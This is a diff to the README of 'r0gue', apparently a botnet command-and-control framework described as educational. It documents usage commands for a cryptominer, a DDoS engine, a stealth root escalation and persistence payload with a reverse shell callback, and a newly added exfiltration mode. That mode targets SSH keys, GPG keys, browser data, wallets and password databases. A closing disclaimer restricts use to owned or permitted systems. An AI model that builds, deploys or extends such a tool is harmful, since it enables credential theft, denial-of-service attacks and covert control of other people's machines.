@@ -1,8 +1,12 @@
 # r0gue
 
-ROGUE is a customizable, educational & manually-deployed command-and-control (C2) botnet framework built for secure multi-device orchestration. It supports encrypted communication using AES, with optional peer-to-peer fallback if the primary C2 is unreachable.  
+![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)
+
+ROGUE is a customizable, educational & manually-deployed command-and-control (C2) botnet framework built for secure multi-device orchestration. 
+It supports encrypted communication using AES, with optional peer-to-peer fallback if the primary C2 is unreachable.  
 ROGUE supports implants on Linux, Raspberry Pi, Termux (Android), and iOS environments.  
-This botnet is intended as a learning tool. It comes with real-world ideas and examples to inspire tinkering, experimentation, and growth.  
+This botnet is intended as a learning tool. 
+It comes with real-world ideas and examples to inspire tinkering, experimentation, and growth.  
 Have fun.
 
 ---
@@ -30,11 +34,13 @@ sudo apt install python3-pycryptodome
 
 * `rogue_c2.py` – Encrypted command-and-control server
 * `rogue_implant.py` – Bot implant for manual deployment with trigger handling, payload loader, and stealth logic
+
 * `payloads/` – Folder containing executable modules such as:
 
   * `mine.py`: Real CPU-based cryptocurrency miner
-  * `ddos.py`: Threaded DDoS engine with HTTP, TCP SYN, and UDP floods
+  * `ddos.py`: Threaded DDoS engine with HTTP, TCP SYN, and UDP floods. now with continous mode xo.
   * `polyroot.py`: Privilege escalation and root persistence payload (see below)
+
 
 ---
 
@@ -120,9 +126,10 @@ nc -lvnp 9001
 trigger_mine
 trigger_ddos
 trigger_polyroot
+trigger_exfil <default|deep|/path>
 ```
 
-These will instruct all bots to fetch and execute the specified payload automatically.
+These will instruct all bots to fetch and execute the specified payload or exfil logic automatically.
 
 ---
 
@@ -144,6 +151,30 @@ run_payload ddos.py trigger_ddos 192.168.0.99 80 60 150 http
 
 ---
 
+### Exfiltration Modes
+
+Rogue includes encrypted file and folder exfiltration using AES-secured zip archives. Output is auto-decrypted by the C2 and saved with timestamps.
+
+| Command                     | Description                                                   |
+| --------------------------- | ------------------------------------------------------------- |
+| trigger\_exfil default      | Exfiltrates: `Documents`, `Downloads`, `Pictures`, `Desktop`  |
+| trigger\_exfil deep         | Exfiltrates hidden targets like `.ssh`, browser data, wallets |
+| trigger\_exfil /custom/path | Exfiltrates any specified file or folder                      |
+
+#### Deep Exfil includes filtered files:
+
+* `~/.ssh`, `~/.gnupg`, `~/.mozilla`, `~/.config/google-chrome`
+* `~/.wallets`, `~/.config/BraveSoftware`
+* File extensions: `.db`, `.sqlite`, `.zip`, `.kdbx`, `.csv`, `.json`, `.bak`
+
+Decrypted output is saved by the C2 to:
+
+```bash
+exfil_dec_<ip>_<timestamp>.zip
+```
+
+---
+
 ## New Payload: `polyroot.py`
 
 `polyroot.py` is a stealth root escalation payload that:
@@ -153,18 +184,18 @@ run_payload ddos.py trigger_ddos 192.168.0.99 80 60 150 http
 * Drops itself as a hidden `.update`, `.svc`, or `.cache` file
 * Optionally installs via cron or LFI-staged loader
 * Reports success back to C2 with real-time output
-* 
+
+---
+
 ## Polyroot Reverse Shell Behavior
 
-When polyroot.py executes successfully and root escalation is achieved, it:
+When `polyroot.py` executes successfully and root escalation is achieved, it:
 
-Drops a polymorphic SUID payload
+* Drops a polymorphic SUID payload
+* Attempts to initiate a reverse shell connection back to the Rogue C2
 
-Attempts to initiate a reverse shell connection back to the Rogue C2
-
-The C2 IP is taken from the environment variable ROGUE_C2_HOST (or defaults to 127.0.0.1)
-
-The callback connects to port 9001
+The C2 IP is taken from the environment variable `ROGUE_C2_HOST` (or defaults to `127.0.0.1`)
+The callback connects to port `9001`
 
 Tip: Always start a listener before triggering the payload:
 
@@ -195,7 +226,7 @@ load_payload .update
 run_payload .update
 ```
 
- Best served over port 8000 like other payloads.
+Best served over port 8000 like other payloads.
 
 ---
 
@@ -274,6 +305,8 @@ python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
 * DNS flux with DuckDNS or No-IP
 * GitHub Gist command polling
 * Discord-based command channels
+* Add support for windows
+* Write implant in C
 
 ---
 
@@ -284,3 +317,4 @@ You are responsible for your own usage.
 Never use ROGUE on systems you do not **own or have permission** to test.
 All code is provided as-is, without warranty or support.
 
+![rogue banner](https://github.com/user-attachments/assets/f07a8780-9551-4eda-8dd1-bb797d1d08b9)
